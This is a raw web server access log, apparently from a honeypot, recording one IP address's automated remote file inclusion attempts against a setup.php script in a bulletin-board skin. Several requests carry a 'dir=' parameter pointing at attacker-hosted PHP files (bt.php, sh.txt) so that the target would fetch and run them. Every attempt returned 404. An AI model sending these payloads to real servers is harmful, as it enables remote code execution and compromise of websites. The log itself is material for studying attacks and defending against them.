180.179.212.237 - - [28/Jun/2015:17:53:57 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:57 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:59 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:54:00 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:54:01 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:54:02 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:54:05 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:06 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:06 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:13 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:18 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:25 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:30 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:32 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:32 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:34 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:54:34 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
